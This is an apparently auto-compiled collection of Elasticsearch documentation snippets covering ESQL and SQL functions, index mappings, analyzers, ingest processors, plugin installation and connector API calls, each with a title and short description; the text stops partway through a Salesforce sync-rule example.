DESCRIPTION: This SQL query demonstrates the usage of a function that concatenates values from two multi-value fields in Elasticsearch. The function is being tested as part of the ESQL framework.

LANGUAGE: sql
CODE:
SELECT CONCAT_WS(',', ARRAY_DISTINCT(SORT(CONCAT_MULTI_VALUES(a, b)))) AS concat_multi_values
FROM test
ORDER BY CHAR_LENGTH(concat_multi_values), concat_multi_values

----------------------------------------

TITLE: Deleting an Elasticsearch Extension
DESCRIPTION: Shows how to delete an Elasticsearch extension that is not currently referenced in any deployment plan.

LANGUAGE: shell
CODE:
curl -X DELETE \
  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \
  -H "Authorization: ApiKey $CLOUD_API_KEY" \
  -H 'Content-Type: application/json'

----------------------------------------

TITLE: Calculating Percentile and Median in ESQL
DESCRIPTION: Example showing how to calculate the 50th percentile and median of an array of integers using MV_PERCENTILE and MV_MEDIAN functions. The example processes an array [5, 5, 10, 12, 5000] to demonstrate both functions return the same value (10) for the median case.

LANGUAGE: esql
CODE:
ROW values = [5, 5, 10, 12, 5000]
| EVAL p50 = MV_PERCENTILE(values, 50), median = MV_MEDIAN(values)

----------------------------------------

TITLE: Defining P-Series Parameters in Markdown
DESCRIPTION: Documents two key parameters used in P-Series calculations: a multivalue number expression and a p constant that determines the weighted sum contribution.

LANGUAGE: markdown
CODE:
**Parameters**

`number`
:   Multivalue expression.

`p`
:   It is a constant number that represents the *p* parameter in the P-Series. It impacts every element's contribution to the weighted sum.

----------------------------------------

TITLE: Using LongGaugeMetric Utility in Java for Elasticsearch Metrics
DESCRIPTION: Demonstrates the use of LongGaugeMetric utility when direct access to the state is not available. This allows setting the gauge value after registration.

LANGUAGE: java
CODE:
MeterRegistry meterRegistry ;
LongGaugeMetric longGaugeMetric = LongGaugeMetric.create(meterRegistry, "es.test.gauge", "a test gauge", "total value");
longGaugeMetric.set(123L);

----------------------------------------

TITLE: Configuring Kuromoji Readingform Analyzers in Elasticsearch
DESCRIPTION: This snippet demonstrates how to set up custom analyzers using the kuromoji_readingform token filter. It creates two analyzers: one for romaji output and another for katakana output.

LANGUAGE: json
CODE:
PUT kuromoji_sample
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "romaji_analyzer": {
            "tokenizer": "kuromoji_tokenizer",
            "filter": [ "romaji_readingform" ]
          },
          "katakana_analyzer": {
            "tokenizer": "kuromoji_tokenizer",
            "filter": [ "katakana_readingform" ]
          }
        },
        "filter": {
          "romaji_readingform": {
            "type": "kuromoji_readingform",
            "use_romaji": true
          },
          "katakana_readingform": {
            "type": "kuromoji_readingform",
            "use_romaji": false
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Escaping Special Characters with Backslashes in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to escape special characters using backslashes in an ESQL query. It shows matching a string containing parentheses using the RLIKE operator with escaped characters.

LANGUAGE: esql
CODE:
ROW message = "foo ( bar"
| WHERE message RLIKE "foo \\( bar"

----------------------------------------

TITLE: Configuring Dimension Fields Limit
DESCRIPTION: Setting to specify the maximum number of time series dimensions for the index.

LANGUAGE: properties
CODE:
index.mapping.dimension_fields.limit: 32768

----------------------------------------

TITLE: Basic ESQL Enrichment
DESCRIPTION: Basic example of using the ENRICH command to add language name data based on a language code.

LANGUAGE: esql
CODE:
ROW language_code = "1"
| ENRICH languages_policy

----------------------------------------

TITLE: Displaying Less Than Operator Image in Markdown
DESCRIPTION: This snippet embeds an SVG image representing the 'less than' operator using Markdown syntax. It includes alt text and CSS class for centered alignment.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/operators/less_than.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Equivalent SQL Query Using Explicit Multi-field Reference
DESCRIPTION: SQL query explicitly referencing the 'raw' keyword multi-field for exact matching. This query is functionally equivalent to the previous one.

LANGUAGE: sql
CODE:
SELECT first_name FROM index WHERE first_name.raw = 'John'

----------------------------------------

TITLE: Indexing and Retrieving Enriched Geo-grid Data in Elasticsearch
DESCRIPTION: This example demonstrates how to index a document using the enriched geo-grid ingest pipeline and retrieve the resulting document with additional tile information.

LANGUAGE: console
CODE:
PUT geocells/_doc/1?pipeline=geohex2shape
{
  "geocell": "811fbffffffffff"
}

GET geocells/_doc/1

----------------------------------------

TITLE: Filtering IP Addresses with CIDR_MATCH in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates the usage of the CIDR_MATCH function in an Elasticsearch SQL query. It filters records from the 'hosts' table where the 'ip1' field matches any of the specified CIDR blocks. The query then selects specific fields from the matching records.

LANGUAGE: sql
CODE:
FROM hosts
| WHERE CIDR_MATCH(ip1, "127.0.0.2/32", "127.0.0.3/32")
| KEEP card, host, ip0, ip1

----------------------------------------

TITLE: Completion Suggester Mapping
DESCRIPTION: Basic mapping configuration for completion suggester field type

LANGUAGE: console
CODE:
PUT music
{
  "mappings": {
    "properties": {
      "suggest": {
        "type": "completion"
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Weighted Average in Elasticsearch SQL
DESCRIPTION: SQL query that calculates the weighted average of salary weighted by height, grouped by languages. The result is rounded and sorted by language, showing only the weighted average and language columns.

LANGUAGE: sql
CODE:
FROM employees
| STATS w_avg = WEIGHTED_AVG(salary, height) by languages
| EVAL w_avg = ROUND(w_avg)
| KEEP w_avg, languages
| SORT languages

----------------------------------------

TITLE: Configuring Sort Processor in Elasticsearch
DESCRIPTION: Example configuration for the Sort processor that sorts array elements. The processor can sort arrays numerically or lexicographically depending on the content type. This example shows sorting an array field in descending order.

LANGUAGE: javascript
CODE:
{
  "sort": {
    "field": "array_field_to_sort",
    "order": "desc"
  }
}

----------------------------------------

TITLE: Concurrent Shard Request Control in Elasticsearch
DESCRIPTION: Example showing how to limit the number of concurrent shard requests per node using the max_concurrent_shard_requests parameter.

LANGUAGE: console
CODE:
GET /my-index-000001/_search?max_concurrent_shard_requests=3
{
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

----------------------------------------

TITLE: Map Initialization and Access in Painless
DESCRIPTION: Demonstrates the map initialization operator '[:]' for creating Map instances and the map access operator '[]' for put/get operations in Painless.

LANGUAGE: painless
CODE:
Map empty = [:];
Map map = [1:2, 3:4, 5:6];

Map map = new HashMap();
map['value2'] = 2;
map['value5'] = 5;
int x = map['value2'] + map['value5'];

----------------------------------------

TITLE: Installing Elasticsearch Plugin from HTTP URL
DESCRIPTION: Command to install an Elasticsearch plugin from an HTTP URL endpoint.

LANGUAGE: shell
CODE:
sudo bin/elasticsearch-plugin install https://some.domain/path/to/plugin.zip

----------------------------------------

TITLE: Building Elasticsearch Plugin with Gradle
DESCRIPTION: Command to build and bundle an Elasticsearch plugin into a ZIP file using Gradle. The output is written to the build/distributions directory.

LANGUAGE: sh
CODE:
gradle bundlePlugin

----------------------------------------

TITLE: Converting WKT to Geo Point and Extracting Coordinates in ESQL
DESCRIPTION: This ESQL snippet demonstrates how to convert a WKT (Well-Known Text) representation of a point to a geo_point data type using TO_GEOPOINT function, and then extract its X and Y coordinates using ST_X and ST_Y functions. The result is stored in a row with three columns: the original point, its X coordinate, and its Y coordinate.

LANGUAGE: esql
CODE:
ROW point = TO_GEOPOINT("POINT(42.97109629958868 14.7552534006536)")
| EVAL x =  ST_X(point), y = ST_Y(point)

----------------------------------------

TITLE: Documenting Hash Function Parameters in ESQL
DESCRIPTION: Documentation block describing the input parameter for a hashing function. This appears to be an auto-generated template that shouldn't be edited directly.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`input`
:   Input to hash.

----------------------------------------

TITLE: Grouping Data with BUCKET Function in ESQL
DESCRIPTION: This snippet demonstrates how to use the BUCKET function with a time span to group employee hire dates by week.

LANGUAGE: esql
CODE:
FROM employees
| WHERE hire_date >= "1985-01-01T00:00:00Z" AND hire_date < "1986-01-01T00:00:00Z"
| STATS hires_per_week = COUNT(*) BY week = BUCKET(hire_date, 1 week)
| SORT week

----------------------------------------

TITLE: Cron Expression Format
DESCRIPTION: Shows the basic format for cron expressions used in Elasticsearch scheduling, with all required fields in order.

LANGUAGE: txt
CODE:
    <seconds> <minutes> <hours> <day_of_month> <month> <day_of_week> [year]

----------------------------------------

TITLE: Executing SHOW CATALOGS command in Elasticsearch SQL
DESCRIPTION: This SQL command lists all available catalogs in Elasticsearch and their types. It returns a result set with two columns: 'name' for the catalog name and 'type' indicating whether it's a local or remote catalog.

LANGUAGE: sql
CODE:
SHOW CATALOGS

LANGUAGE: sql
CODE:
SHOW CATALOGS;

     name         |     type
------------------+---------------
javaRestTest         |local
my_remote_cluster |remote

----------------------------------------

TITLE: Customizing Word Delimiter Graph Filter
DESCRIPTION: Example of creating a custom word_delimiter_graph filter with specific rules for token splitting and normalization.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "keyword",
          "filter": [ "my_custom_word_delimiter_graph_filter" ]
        }
      },
      "filter": {
        "my_custom_word_delimiter_graph_filter": {
          "type": "word_delimiter_graph",
          "type_table": [ "- => ALPHA" ],
          "split_on_case_change": false,
          "split_on_numerics": false,
          "stem_english_possessive": true
        }
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing text with common grams filter in Elasticsearch
DESCRIPTION: This example demonstrates how to use the analyze API with a common grams filter to create bigrams for the words 'is' and 'the'.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer" : "whitespace",
  "filter" : [
    {
      "type": "common_grams",
      "common_words": ["is", "the"]
    }
  ],
  "text" : "the quick fox is brown"
}

----------------------------------------

TITLE: Creating an Index with Histogram Field in Elasticsearch
DESCRIPTION: This example demonstrates how to create a new index with a histogram field and a keyword field using the create index API in Elasticsearch.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings" : {
    "properties" : {
      "my_histogram" : {
        "type" : "histogram"
      },
      "my_text" : {
        "type" : "keyword"
      }
    }
  }
}

----------------------------------------

TITLE: Adding Settings to Keystore
DESCRIPTION: Multiple examples of adding settings to the keystore, including interactive input and stdin methods.

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore add the.setting.name.to.set

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore add \
  the.setting.name.to.set \
  the.other.setting.name.to.set

LANGUAGE: shell
CODE:
cat /file/containing/setting/value | bin/elasticsearch-keystore add --stdin the.setting.name.to.set

----------------------------------------

TITLE: EQL Sequence Query
DESCRIPTION: Example of an EQL sequence query that matches a series of ordered events.

LANGUAGE: eql
CODE:
sequence
  [ file where file.extension == "exe" ]
  [ process where true ]

----------------------------------------

TITLE: Histogram Aggregation with Minimum Document Count in Elasticsearch
DESCRIPTION: Elasticsearch query showing how to use the 'min_doc_count' parameter to filter out buckets with fewer than a specified number of documents.

LANGUAGE: json
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "prices": {
      "histogram": {
        "field": "price",
        "interval": 50,
        "min_doc_count": 1
      }
    }
  }
}

----------------------------------------

TITLE: Calculating String Lengths with ESQL LENGTH Function
DESCRIPTION: Demonstrates using the LENGTH function to count characters in city names from an airports dataset. The query filters for Indian airports, keeps only the city column, and adds a new column with the length of each city name.

LANGUAGE: esql
CODE:
FROM airports
| WHERE country == "India"
| KEEP city
| EVAL fn_length = LENGTH(city)

----------------------------------------

TITLE: Configuring Shard Request Cache Size and Expiration
DESCRIPTION: Static cluster settings for controlling the shard request cache behavior. The size setting determines maximum cache size as a percentage of heap memory, while expire setting controls TTL for cached results.

LANGUAGE: yaml
CODE:
indices.requests.cache.size: 1%
indices.requests.cache.expire: <time_value>

----------------------------------------

TITLE: Documenting ATAN2 Function Parameters in Elasticsearch SQL
DESCRIPTION: This snippet defines the parameters for the ATAN2 function in Elasticsearch SQL. It specifies the y_coordinate and x_coordinate parameters, both of which return null if the input is null.

LANGUAGE: markdown
CODE:
**Parameters**

`y_coordinate`
:   y coordinate. If `null`, the function returns `null`.

`x_coordinate`
:   x coordinate. If `null`, the function returns `null`.

----------------------------------------

TITLE: Installing Mapper Annotated Text Plugin in Elasticsearch
DESCRIPTION: Command to install the mapper-annotated-text plugin using the Elasticsearch plugin manager. This plugin must be installed on every node in the cluster, and each node must be restarted after installation.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install mapper-annotated-text

----------------------------------------

TITLE: Complex AVG with Multi-valued Column in ESQL
DESCRIPTION: Advanced example demonstrating how to calculate the average of a multi-valued column using MV_AVG inside AVG, with ROUND function for precision control.

LANGUAGE: esql
CODE:
FROM employees
| STATS avg_salary_change = ROUND(AVG(MV_AVG(salary_change)), 10)

----------------------------------------

TITLE: Syntax for SHOW FUNCTIONS Command in Elasticsearch SQL
DESCRIPTION: The basic syntax for the SHOW FUNCTIONS command, with an optional LIKE clause for filtering results based on a pattern.

LANGUAGE: sql
CODE:
SHOW FUNCTIONS [LIKE pattern]?

----------------------------------------

TITLE: Customizing Delimited Payload Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to create a custom delimited_payload filter with a '+' delimiter and integer payload encoding, and use it in a custom analyzer.

LANGUAGE: console
CODE:
PUT delimited_payload_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "whitespace_plus_delimited": {
          "tokenizer": "whitespace",
          "filter": [ "plus_delimited" ]
        }
      },
      "filter": {
        "plus_delimited": {
          "type": "delimited_payload",
          "delimiter": "+",
          "encoding": "int"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using EXTRACT Function
DESCRIPTION: Example of using EXTRACT function to extract a specific part from a date/time value.

LANGUAGE: sql
CODE:
SELECT EXTRACT(DAY_OF_YEAR FROM CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;

----------------------------------------

TITLE: Renaming and Expanding Fields in Elasticsearch Pipeline
DESCRIPTION: This example shows a pipeline that first renames a conflicting field and then applies the dot expander processor. This is necessary when a non-leaf field conflicts with an existing field of the same name.

LANGUAGE: json
CODE:
{
  "processors" : [
    {
      "rename" : {
        "field" : "foo",
        "target_field" : "foo.bar"
      }
    },
    {
      "dot_expander": {
        "field": "foo.bar"
      }
    }
  ]
}

----------------------------------------

TITLE: Example GraphQL Query with Variables
DESCRIPTION: Sample GraphQL query demonstrating the use of variables for fetching user data.

LANGUAGE: javascript
CODE:
query getUser($id: ID!) {
    user(id: $id) {
        name
        email
    }
}

----------------------------------------

TITLE: Including ENDS_WITH Function Type Information in Markdown
DESCRIPTION: This snippet includes the type information for the ENDS_WITH function from a separate markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../types/ends_with.md
:::

----------------------------------------

TITLE: Example GraphQL Query with Cursor-based Pagination
DESCRIPTION: GraphQL query demonstrating the structure required for cursor-based pagination.

LANGUAGE: javascript
CODE:
query getUsers($cursor: String!) {
    sampleData {
        users(after: $cursor) {
            pageInfo {
                endCursor
                hasNextPage
            }
            nodes {
                first_name
                last_name
                address
            }
        }
    }
}

----------------------------------------

TITLE: Indexing an Envelope shape in GeoJSON format
DESCRIPTION: Example of indexing an envelope shape using the GeoJSON format in Elasticsearch. Envelopes are represented by coordinates for upper left and lower right points.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "envelope",
    "coordinates" : [ [1000.0, 100.0], [1001.0, 100.0] ]
  }
}

----------------------------------------

TITLE: Defining NestedDocument Operations for Elasticsearch Update By Query Scripts
DESCRIPTION: Specifies allowed operations on nested documents within fields, including field access and removal.

LANGUAGE: Java
CODE:
class org.elasticsearch.script.field.NestedDocument {
    WriteField field(String)
    Stream fields(String)
    boolean isEmpty()
    int size()
    boolean exists()
    void remove()
}

----------------------------------------

TITLE: GROK Complex Parsing Example
DESCRIPTION: Example showing parsing of timestamp, IP, email and number using GROK with type conversion

LANGUAGE: esql
CODE:
ROW a = "2023-01-23T12:15:00.000Z 127.0.0.1 some.email@foo.com 42"
| GROK a """%{TIMESTAMP_ISO8601:date} %{IP:ip} %{EMAILADDRESS:email} %{NUMBER:num:int}"""
| KEEP date, ip, email, num
| EVAL date = TO_DATETIME(date)

----------------------------------------

TITLE: While Loop in Painless
DESCRIPTION: While loop example showing condition checking against document source fields using ctx._source reference.

LANGUAGE: painless
CODE:
while (ctx._source.item < condition) {
  // do something
}

----------------------------------------

TITLE: Distribution Compatibility Check in Java
DESCRIPTION: Shows how to implement a conditional test execution based on distribution compatibility using JUnit assumptions.

LANGUAGE: java
CODE:
assumeTrue(distribution.packaging.compatible);

----------------------------------------

TITLE: Categorizing Server Logs with ESQL CATEGORIZE Function
DESCRIPTION: This ESQL query uses the CATEGORIZE function to group server log messages into categories and count their occurrences. It demonstrates how to use STATS and COUNT in combination with CATEGORIZE for log analysis.

LANGUAGE: esql
CODE:
FROM sample_data
| STATS count=COUNT() BY category=CATEGORIZE(message)

----------------------------------------

TITLE: Calculating Standard Deviation in Elasticsearch SQL
DESCRIPTION: Returns the population standard deviation of input values using the STDDEV_POP function.

LANGUAGE: sql
CODE:
SELECT MIN(salary) AS min, MAX(salary) AS max, STDDEV_POP(salary) AS stddev FROM emp;

LANGUAGE: sql
CODE:
SELECT MIN(salary / 12.0) AS min, MAX(salary / 12.0) AS max, STDDEV_POP(salary / 12.0) AS stddev FROM emp;

----------------------------------------

TITLE: Input Document for JSON Processor in Elasticsearch
DESCRIPTION: This snippet shows an example input document containing a JSON string that will be processed by the JSON processor.

LANGUAGE: json
CODE:
{
  "string_source": "{\"foo\": 2000}"
}

----------------------------------------

TITLE: Simulating Registered Domain Processor Pipeline in Elasticsearch
DESCRIPTION: Example showing how to use the registered domain processor to extract domain components from a FQDN. The processor extracts subdomain, registered domain, top-level domain, and full domain into a target field.

LANGUAGE: console
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
    "processors": [
      {
        "registered_domain": {
          "field": "fqdn",
          "target_field": "url"
        }
      }
    ]
  },
  "docs": [
    {
      "_source": {
        "fqdn": "www.example.ac.uk"
      }
    }
  ]
}

LANGUAGE: console
CODE:
{
  "docs": [
    {
      "doc": {
        "_source": {
          "fqdn": "www.example.ac.uk",
          "url": {
            "subdomain": "www",
            "registered_domain": "example.ac.uk",
            "top_level_domain": "ac.uk",
            "domain": "www.example.ac.uk"
          }
        }
      }
    }
  ]
}

----------------------------------------

TITLE: Using FLOOR Function in Elasticsearch SQL
DESCRIPTION: Demonstrates how to use the FLOOR function to round a number down to the nearest integer. This function maintains the original value for long and integer types, while for double values it behaves similarly to Math.floor by selecting the closest double value to the integer.

LANGUAGE: sql
CODE:
ROW a=1.8
| EVAL a=FLOOR(a)

----------------------------------------

TITLE: Using AND Operator in Elasticsearch SQL Query
DESCRIPTION: This snippet demonstrates the use of the AND operator to combine two conditions in a SELECT statement. It filters employees with employee numbers between 10000 and 10005.

LANGUAGE: sql
CODE:
SELECT last_name l FROM "test_emp" WHERE emp_no > 10000 AND emp_no < 10005 ORDER BY emp_no LIMIT 5;

----------------------------------------

TITLE: Initializing Circle Mapping and Pipeline in Elasticsearch
DESCRIPTION: Creates an index with geo_shape mapping and sets up an ingest pipeline to convert circles to polygons. The pipeline configuration includes error distance and shape type parameters.

LANGUAGE: console
CODE:
PUT circles
{
  "mappings": {
    "properties": {
      "circle": {
        "type": "geo_shape"
      }
    }
  }
}

PUT _ingest/pipeline/polygonize_circles
{
  "description": "translate circle to polygon",
  "processors": [
    {
      "circle": {
        "field": "circle",
        "error_distance": 28.0,
        "shape_type": "geo_shape"
      }
    }
  ]
}

----------------------------------------

TITLE: Updating Cache Settings Dynamically
DESCRIPTION: Example demonstrating how to dynamically enable or disable the shard request cache on an existing index using the update settings API.

LANGUAGE: console
CODE:
PUT /my-index-000001/_settings
{
  "index.requests.cache.enable": true
}

----------------------------------------

TITLE: Installing Elasticsearch Plugin from Local File - Windows
DESCRIPTION: Command to install an Elasticsearch plugin from a local file system path on Windows systems. Paths containing spaces must be wrapped in quotes.

LANGUAGE: shell
CODE:
bin\elasticsearch-plugin install file:///C:/path/to/plugin.zip

----------------------------------------

TITLE: Testing Custom Token Filter with Elasticsearch _analyze API
DESCRIPTION: This console command demonstrates how to use the _analyze API to test the custom 'hello_world' token filter after it has been installed in Elasticsearch.

LANGUAGE: console
CODE:
GET /_analyze
{
  "text": "hello to everyone except the world",
  "tokenizer": "standard",
  "filter":  ["hello_world"]
}

----------------------------------------

TITLE: Describing MEDIAN_ABSOLUTE_DEVIATION Function in ESQL
DESCRIPTION: Explains the MEDIAN_ABSOLUTE_DEVIATION function, its use case for data with outliers, and its calculation method. It also notes that the function is usually approximate, similar to the PERCENTILE function.

LANGUAGE: markdown
CODE:
**Description**

Returns the median absolute deviation, a measure of variability. It is a robust statistic, meaning that it is useful for describing data that may have outliers, or may not be normally distributed. For such data it can be more descriptive than standard deviation.  It is calculated as the median of each data point's deviation from the median of the entire sample. That is, for a random variable `X`, the median absolute deviation is `median(|median(X) - X|)`.

::::{note}
Like [`PERCENTILE`](/reference/query-languages/esql/esql-functions-operators.md#esql-percentile), `MEDIAN_ABSOLUTE_DEVIATION` is [usually approximate](/reference/query-languages/esql/esql-functions-operators.md#esql-percentile-approximate).
::::

----------------------------------------

TITLE: Updating Elasticsearch Extension Metadata
DESCRIPTION: Demonstrates how to update the name or version of an existing Elasticsearch extension without uploading a new file.

LANGUAGE: shell
CODE:
curl -X POST \
  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \
  -H "Authorization: ApiKey $CLOUD_API_KEY" \
  -H 'Content-Type: application/json' \
  -d '{
   "extension_type" : "plugin",
    "name": "custom-plugin-07012020",
   "version" : "8.4.3"
}'

----------------------------------------

TITLE: Min Bucket Aggregation Example with Sales Data
DESCRIPTION: Demonstrates using min_bucket aggregation to find minimum monthly sales. Uses date_histogram for temporal bucketing and sum aggregation for sales calculation.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "size": 0,
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "sales": {
          "sum": {
            "field": "price"
          }
        }
      }
    },
    "min_monthly_sales": {
      "min_bucket": {
        "buckets_path": "sales_per_month>sales"
      }
    }
  }
}

----------------------------------------

TITLE: Defining IntBuffer Class in Java NIO
DESCRIPTION: Defines the IntBuffer class with a method to get an integer at a specific index. Some methods are commented out as TODOs.

LANGUAGE: Java
CODE:
class java.nio.IntBuffer {
  int get(int)
  # TODO: https:#github.com/elastic/elasticsearch/issues/79867
  # IntBuffer get(int, int[])
  # IntBuffer get(int, int[], int, int)
}

----------------------------------------

TITLE: Comma-Separated Pattern Tokenizer Configuration
DESCRIPTION: Shows how to configure a pattern tokenizer to split text on commas and analyze text using the custom analyzer.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "my_tokenizer"
        }
      },
      "tokenizer": {
        "my_tokenizer": {
          "type": "pattern",
          "pattern": ","
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_analyzer",
  "text": "comma,separated,values"
}

LANGUAGE: text
CODE:
[ comma, separated, values ]

----------------------------------------

TITLE: Field Capabilities Query with Alias
DESCRIPTION: Example demonstrating how to use wildcard patterns with field aliases in a field capabilities query.

LANGUAGE: console
CODE:
GET trips/_field_caps?fields=route_*,transit_mode

----------------------------------------

TITLE: Creating API Key for Gmail Connector
DESCRIPTION: API call to generate security credentials for the Gmail connector with required permissions

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Concatenating String Array with MV_CONCAT in ESQL
DESCRIPTION: This snippet demonstrates how to use the MV_CONCAT function to concatenate elements of a string array into a single string, separated by a delimiter.

LANGUAGE: esql
CODE:
ROW a=["foo", "zoo", "bar"]
| EVAL j = MV_CONCAT(a, ", ")

----------------------------------------

TITLE: Documenting Date Formatting Function Parameters in Elasticsearch ESQL
DESCRIPTION: This snippet defines the parameters for a date formatting function in ESQL. It specifies two parameters: 'dateFormat' (optional) and 'date' (required). The function handles null inputs and uses a default format if none is provided.

LANGUAGE: markdown
CODE:
**Parameters**

`dateFormat`
:   Date format (optional).  If no format is specified, the `yyyy-MM-dd'T'HH:mm:ss.SSSZ` format is used. If `null`, the function returns `null`.

`date`
:   Date expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: IP Prefix Manipulation Example using ESQL
DESCRIPTION: Demonstrates the use of ip_prefix() function to manipulate both IPv4 and IPv6 addresses. For IPv4, applies a /24 prefix mask, and for IPv6, applies a /112 prefix mask from the end of the address.

LANGUAGE: esql
CODE:
row ip4 = to_ip("1.2.3.4"), ip6 = to_ip("fe80::cae2:65ff:fece:feb9")
| eval ip4_prefix = ip_prefix(ip4, 24, 0), ip6_prefix = ip_prefix(ip6, 0, 112);

----------------------------------------

TITLE: Creating Mapping with Join Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create a mapping with a join field that defines a parent-child relationship between questions and answers.

LANGUAGE: console
CODE:
PUT parent_example
{
  "mappings": {
     "properties": {
       "join": {
         "type": "join",
         "relations": {
           "question": "answer"
         }
       }
     }
  }
}

----------------------------------------

TITLE: Executing KQL Query Function in SQL
DESCRIPTION: This SQL snippet demonstrates the usage of the KQL query function in Elasticsearch. It performs a KQL query and returns true if the provided KQL query string matches the row.

LANGUAGE: sql
CODE:
SELECT kql_query('bool: true') AS result;

----------------------------------------

TITLE: Converting Multivalue to Single Value using MV_LAST in ESQL
DESCRIPTION: Demonstrates how to use the MV_LAST function to extract the last value from a delimited string after splitting it. The example shows splitting a semicolon-delimited string and getting the last element.

LANGUAGE: sql
CODE:
ROW a="foo;bar;baz"
| EVAL last_a = MV_LAST(SPLIT(a, ";"))

----------------------------------------

TITLE: Log Configuration for GCE Discovery
DESCRIPTION: YAML configuration for enabling trace-level logging for GCE discovery.

LANGUAGE: yaml
CODE:
# discovery
logger.discovery_gce.name = discovery.gce
logger.discovery_gce.level = trace

----------------------------------------

TITLE: Parsing Date String to Date Object using DATE_PARSE in ESQL
DESCRIPTION: This snippet demonstrates how to use the DATE_PARSE function in ESQL to convert a date string in 'yyyy-MM-dd' format to a date object. It creates a row with a date string and then uses EVAL to parse it into a date.

LANGUAGE: esql
CODE:
ROW date_string = "2022-05-06"
| EVAL date = DATE_PARSE("yyyy-MM-dd", date_string)

----------------------------------------

TITLE: Nested Aggregation with Top Hits in Elasticsearch
DESCRIPTION: This example demonstrates how to use the top_hits aggregator within a nested aggregation to return nested hits from a nested field type configuration.

LANGUAGE: json
CODE:
{
  "query": {
    "term": { "tags": "car" }
  },
  "aggs": {
    "by_sale": {
      "nested": {
        "path": "comments"
      },
      "aggs": {
        "by_user": {
          "terms": {
            "field": "comments.username",
            "size": 1
          },
          "aggs": {
            "by_nested": {
              "top_hits": {}
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Keyed Response in IP Range Aggregation
DESCRIPTION: This snippet demonstrates how to get a keyed response from an IP range aggregation by setting the 'keyed' flag to true. This associates a unique string key with each bucket in the response.

LANGUAGE: console
CODE:
GET /ip_addresses/_search
{
  "size": 0,
  "aggs": {
    "ip_ranges": {
      "ip_range": {
        "field": "ip",
        "ranges": [
          { "to": "10.0.0.5" },
          { "from": "10.0.0.5" }
        ],
        "keyed": true
      }
    }
  }
}

----------------------------------------

TITLE: Creating OneDrive Connector via API
DESCRIPTION: API call to create a new OneDrive connector instance in Elasticsearch

LANGUAGE: console
CODE:
PUT _connector/my-onedrive-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from OneDrive",
  "service_type": "onedrive"
}

----------------------------------------

TITLE: Calculating Median of Maximum Salary Change Using Inline Functions in ESQL
DESCRIPTION: This example demonstrates how to combine the MEDIAN aggregate function with the MV_MAX inline function to calculate the median of the maximum values of a multivalued salary_change column.

LANGUAGE: esql
CODE:
FROM employees
| STATS median_max_salary_change = MEDIAN(MV_MAX(salary_change))

----------------------------------------

TITLE: Creating and Querying Regular Object Arrays in Elasticsearch
DESCRIPTION: Example showing how regular object arrays are flattened in Elasticsearch, demonstrating the loss of field associations in non-nested objects.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1
{
  "group" : "fans",
  "user" : [ 
    {
      "first" : "John",
      "last" :  "Smith"
    },
    {
      "first" : "Alice",
      "last" :  "White"
    }
  ]
}

LANGUAGE: js
CODE:
{
  "group" :        "fans",
  "user.first" : [ "alice", "john" ],
  "user.last" :  [ "smith", "white" ]
}

----------------------------------------

TITLE: Analyzing Text with Duplicate Tokens in Elasticsearch
DESCRIPTION: Example of using the analyze API with keyword_repeat and stemmer filters to create and display duplicate tokens.

LANGUAGE: json
CODE:
GET _analyze
{
  "tokenizer": "whitespace",
  "filter": [
    "keyword_repeat",
    "stemmer"
  ],
  "text": "jumping dog"
}

----------------------------------------

TITLE: Configuring Elasticsearch Connectors in YAML
DESCRIPTION: Example YAML configuration for Elasticsearch connectors, including API keys and connector IDs. This snippet demonstrates how to set up multiple connectors with different API keys and service types.

LANGUAGE: yaml
CODE:
# ...
connectors:
  - connector_id: <CONNECTOR-ID>
    api_key: <API-KEY> # Scoped API key for this connector (optional). If not specified, the top-level `elasticsearch.api_key` value is used.
    service_type: gmail # example

----------------------------------------

TITLE: Advanced Sync Rules for Salesforce Connector
DESCRIPTION: Examples of advanced sync rules for filtering Salesforce data before indexing.

LANGUAGE: js
CODE:
[
  {
    "query": "SELECT Id, Name FROM Account",
